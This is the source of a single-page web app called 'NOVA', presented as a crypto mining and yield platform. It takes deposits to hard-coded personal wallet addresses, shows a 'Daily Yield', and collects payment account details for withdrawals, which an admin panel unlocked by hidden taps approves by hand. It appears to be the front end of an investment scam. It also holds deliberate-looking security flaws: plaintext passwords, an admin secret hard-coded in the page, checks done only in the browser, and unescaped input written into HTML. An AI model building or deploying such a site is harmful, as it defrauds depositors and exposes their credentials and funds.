<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Global Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; --card: rgba(255,255,255,0.03); }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .app-card { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(8,8,8,0.98); backdrop-filter: blur(25px); border-top: 1px solid #151515; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #3d3d3d; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        .screen { display: none; padding-bottom: 120px; }
        .active-screen { display: block; animation: fadeIn 0.4s ease; }
        .modal { display: none; position: fixed; inset: 0; background: black; z-index: 2000; padding: 25px; overflow-y: auto; }
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 15px; border-radius: 15px; color: white; font-size: 12px; outline: none; margin-bottom: 12px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <h1 onclick="handleTaps()" class="text-6xl font-black mb-2 tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <div class="app-card p-8 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input">
            <input type="text" id="adm-key" placeholder="Admin Secret" class="hidden nova-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full bg-[#D4AF37] text-black py-4 rounded-xl font-black text-xs">LOGIN</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-6 text-gray-500 uppercase font-bold cursor-pointer">Register Account</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div id="dash-screen" class="screen active-screen p-6">
            <div class="app-card p-10 mb-8 text-center border-b-2 border-[#D4AF37]/30">
                <p class="text-[9px] text-gray-500 font-black mb-2 uppercase">Net Liquidity</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter mb-4">$0.00</h1>
                <p id="v-daily" class="text-green-500 text-[10px] font-black uppercase">Daily Yield: +$0.00</p>
            </div>
            
            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('dep-modal')" class="app-card p-5 text-xs font-black text-green-500 uppercase">Deposit</button>
                <button onclick="openModal('wd-modal')" class="app-card p-5 text-xs font-black text-red-500 uppercase">Withdraw</button>
            </div>
            <div id="hist-mini" class="space-y-3"></div>
        </div>

        <div id="mine-screen" class="screen p-6"><div id="nodes-container" class="space-y-6"></div></div>
        
        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active"><i class="fa-solid fa-house"></i><span>HOME</span></div>
            <div onclick="nav('mine-screen')" class="nav-item"><i class="fa-solid fa-server"></i><span>MINING</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-8 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-6 gold-text uppercase">Deposit</h2>
        
        <label class="text-[10px] font-bold text-gray-500 ml-1">Select Gateway</label>
        <select id="dep-method" class="nova-input mt-1" onchange="updateDepAddr()">
            <option value="Trust Wallet">Trust Wallet (BEP20)</option>
            <option value="MetaMask">MetaMask (ERC20)</option>
            <option value="Binance">Binance (TRC20)</option>
        </select>

        <div class="app-card p-4 mb-6 bg-black/50 border-dashed border-gray-700">
            <p class="text-[8px] text-gray-500 mb-1 uppercase font-bold">Address</p>
            <p id="dep-addr-txt" class="text-[10px] font-mono break-all text-gray-300">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>

        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="dep-user" placeholder="Your Username" class="nova-input">
        <input type="text" id="dep-tid" placeholder="TID / Transaction ID" class="nova-input">
        
        <div class="mb-6">
            <label class="text-[10px] font-bold text-gray-500 ml-1 uppercase">Upload Proof (Screenshot)</label>
            <input type="file" id="dep-proof" accept="image/*" class="text-[10px] mt-2 text-gray-500">
        </div>

        <button onclick="requestFin('Deposit')" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black uppercase">Submit Deposit</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-8 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 text-red-500 uppercase">Withdraw</h2>
        
        <select id="wd-method" class="nova-input">
            <option value="Trust Wallet">Trust Wallet</option>
            <option value="MetaMask">MetaMask</option>
            <option value="Binance Pay">Binance Pay</option>
            <option value="Coinbase">Coinbase</option>
            <option value="OKX">OKX</option>
            <option value="JazzCash (PK Only)">JazzCash</option>
            <option value="EasyPaisa (PK Only)">EasyPaisa</option>
        </select>

        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="wd-user" placeholder="Account Title / Username" class="nova-input">
        <input type="text" id="wd-acc" placeholder="Account Number / Wallet Address" class="nova-input">
        
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black py-5 rounded-2xl font-black uppercase">Authorize Send</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between mb-8 border-b border-gray-900 pb-4">
            <h2 class="text-[#D4AF37] font-black uppercase text-sm">Command Center</h2>
            <button onclick="location.reload()" class="text-red-500 text-xs font-bold">EXIT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        const addrs = { "Trust Wallet": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "MetaMask": "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2", "Binance": "TRC20_BINANCE_ADDR_HERE" };
        window.updateDepAddr = () => { document.getElementById('dep-addr-txt').innerText = addrs[document.getElementById('dep-method').value]; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return;
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                await setDoc(uRef, { balance: 0, password: pw, daily: 0 });
                localStorage.setItem('nova_session', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_session', id); start(id);
            } else alert("Error");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Daily Yield: +$" + (d.data().daily || 0).toFixed(2);
            });
            loadHistory();
        }

        window.requestFin = async (type) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            let data = { user: activeUser, type, status: 'Pending', time: Date.now() };

            if(type === 'Deposit') {
                data.amount = parseFloat(document.getElementById('dep-amt').value);
                data.method = document.getElementById('dep-method').value;
                data.username = document.getElementById('dep-user').value;
                data.tid = document.getElementById('dep-tid').value;
                // Proof convert to Base64 (Simple way)
                const file = document.getElementById('dep-proof').files[0];
                if(file) {
                    const reader = new FileReader();
                    reader.onloadend = async () => {
                        data.proof = reader.result;
                        await addDoc(collection(db, "logs"), data);
                        alert("Deposit Submitted!"); closeModal('dep-modal');
                    };
                    reader.readAsDataURL(file);
                } else { await addDoc(collection(db, "logs"), data); alert("Submitted!"); closeModal('dep-modal'); }
            } else {
                data.amount = parseFloat(document.getElementById('wd-amt').value);
                data.method = document.getElementById('wd-method').value;
                data.username = document.getElementById('wd-user').value;
                data.acc = document.getElementById('wd-acc').value;
                if(s.data().balance < data.amount) return alert("Low Balance");
                await updateDoc(uRef, { balance: s.data().balance - data.amount });
                await addDoc(collection(db, "logs"), data);
                alert("Withdrawal Sent!"); closeModal('wd-modal');
            }
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="app-card p-5 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'} mb-4">
                        <p class="text-[10px] font-black uppercase mb-2">${r.type} | ${r.user}</p>
                        <p class="text-xl font-black text-white mb-2">$${r.amount}</p>
                        <div class="text-[9px] text-gray-500 bg-black p-3 rounded-lg mb-4">
                            <p>METHOD: ${r.method}</p>
                            <p>NAME: ${r.username}</p>
                            <p>TID/ACC: ${r.tid || r.acc}</p>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-3 rounded-xl text-[9px] font-black">APPROVE</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[9px] font-black">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => {
            if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Success' });
        };

        window.reject = async (id, u, a, t) => {
            if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Rejected' });
        };

        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
        };
    </script>
</body>
</html>
